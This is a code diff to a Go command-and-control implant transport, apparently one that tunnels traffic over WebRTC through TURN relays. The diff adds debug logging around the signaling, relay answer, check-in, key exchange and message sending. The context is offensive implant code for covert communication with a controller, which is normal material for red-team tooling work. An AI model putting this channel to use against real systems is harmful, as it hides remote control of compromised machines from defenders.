@@ -387,6 +387,12 @@ func (c *C2Turnc2) establishWebRTC() error {
 		return fmt.Errorf("no offer_id found in SDP offer payload")
 	}
 
+	utils.PrintDebug(fmt.Sprintf("[turnc2] offer_id=%s, offer SDP length=%d\n", c.OfferID, len(offerPayload.OfferSDP)))
+	utils.PrintDebug(fmt.Sprintf("[turnc2] ICE servers in offer: %d\n", len(offerPayload.ICEServers)))
+	for i, srv := range offerPayload.ICEServers {
+		utils.PrintDebug(fmt.Sprintf("[turnc2]   ICE server[%d]: URLs=%v\n", i, srv.URLs))
+	}
+
 	// Configure ICE servers - use the ones from the offer if available, otherwise use config
 	iceServers := offerPayload.ICEServers
 	if len(iceServers) == 0 && c.TurnServer != "" {
@@ -465,6 +471,7 @@ func (c *C2Turnc2) establishWebRTC() error {
 	})
 
 	// Set the remote description (offer from server)
+	utils.PrintDebug(fmt.Sprintf("[turnc2] setting remote description (server offer)\n"))
 	remoteSDP := pion.SessionDescription{
 		Type: pion.SDPTypeOffer,
 		SDP:  offerPayload.OfferSDP,
@@ -475,6 +482,7 @@ func (c *C2Turnc2) establishWebRTC() error {
 	}
 
 	// Create answer
+	utils.PrintDebug(fmt.Sprintf("[turnc2] creating WebRTC answer\n"))
 	answer, err := pc.CreateAnswer(nil)
 	if err != nil {
 		pc.Close()
@@ -487,16 +495,20 @@ func (c *C2Turnc2) establishWebRTC() error {
 	}
 
 	// Wait for ICE gathering to complete
+	utils.PrintDebug(fmt.Sprintf("[turnc2] waiting for ICE gathering to complete...\n"))
 	gatherComplete := pion.GatheringCompletePromise(pc)
 	<-gatherComplete
+	utils.PrintDebug(fmt.Sprintf("[turnc2] ICE gathering complete\n"))
 
 	// Get the final answer with ICE candidates
 	finalAnswer := pc.LocalDescription()
+	utils.PrintDebug(fmt.Sprintf("[turnc2] local SDP:\n%s\n", finalAnswer.SDP))
 
 	// Extract the minimal answer fields from the local SDP
 	relayAddr, relayPort := extractRelayCandidate(finalAnswer.SDP)
 	if relayAddr == "" || relayPort == 0 {
 		pc.Close()
+		utils.PrintDebug(fmt.Sprintf("[turnc2] no relay candidate found in local SDP, full SDP dumped above\n"))
 		return fmt.Errorf("no relay candidate found in local SDP")
 	}
 
@@ -511,6 +523,9 @@ func (c *C2Turnc2) establishWebRTC() error {
 		pc.Close()
 		return fmt.Errorf("no DTLS fingerprint found in local SDP")
 	}
+
+	utils.PrintDebug(fmt.Sprintf("[turnc2] minimal answer: relay=%s:%d ufrag=%s fingerprint=%s\n",
+		relayAddr, relayPort, iceUfrag, fingerprint))
 
 	// Send the minimal answer to the signaling server
 	sigResp, err := c.sendMinimalAnswer(c.OfferID, relayAddr, relayPort, iceUfrag, icePwd, fingerprint)
@@ -576,6 +591,9 @@ func (c *C2Turnc2) sendMinimalAnswer(offerID, relayAddr string, relayPort int, i
 		return nil, fmt.Errorf("failed to marshal minimal answer: %w", err)
 	}
 
+	utils.PrintDebug(fmt.Sprintf("[turnc2] POST %s (%d bytes)\n", url, len(reqBody)))
+	utils.PrintDebug(fmt.Sprintf("[turnc2] request body: %s\n", string(reqBody)))
+
 	req, err := http.NewRequest("POST", url, bytes.NewReader(reqBody))
 	if err != nil {
 		return nil, fmt.Errorf("failed to create request: %w", err)
@@ -593,6 +611,8 @@ func (c *C2Turnc2) sendMinimalAnswer(offerID, relayAddr string, relayPort int, i
 		return nil, fmt.Errorf("failed to read response body: %w", err)
 	}
 
+	utils.PrintDebug(fmt.Sprintf("[turnc2] response: status=%d body=%s\n", resp.StatusCode, string(body)))
+
 	if resp.StatusCode != http.StatusOK {
 		return nil, fmt.Errorf("signaling server returned %d: %s", resp.StatusCode, string(body))
 	}
@@ -606,7 +626,8 @@ func (c *C2Turnc2) sendMinimalAnswer(offerID, relayAddr string, relayPort int, i
 		return nil, fmt.Errorf("signaling error: %s", sigResp.Error)
 	}
 
-	utils.PrintDebug(fmt.Sprintf("minimal answer sent successfully (status: %s)\n", sigResp.Status))
+	utils.PrintDebug(fmt.Sprintf("[turnc2] signaling success: status=%s server_relay=%s:%d\n",
+		sigResp.Status, sigResp.ServerRelayAddr, sigResp.ServerRelayPort))
 	return &sigResp, nil
 }
 
@@ -741,6 +762,7 @@ func (c *C2Turnc2) SendMessage(output []byte) []byte {
 	}
 
 	encoded := base64.StdEncoding.EncodeToString(output)
+	utils.PrintDebug(fmt.Sprintf("[turnc2] SendMessage: %d bytes (encoded %d bytes)\n", len(output), len(encoded)))
 
 	for i := 0; i < 5; i++ {
 		if c.ShouldStop {
@@ -804,11 +826,14 @@ func (c *C2Turnc2) getData() {
 
 	// Send initial checkin or start key exchange
 	if c.ExchangingKeys {
+		utils.PrintDebug("[turnc2] starting key exchange\n")
 		c.NegotiateKey()
 	} else {
+		utils.PrintDebug("[turnc2] sending initial checkin\n")
 		c.CheckIn()
 	}
 
+	utils.PrintDebug("[turnc2] entering main receive loop\n")
 	for {
 		if c.ShouldStop {
 			return
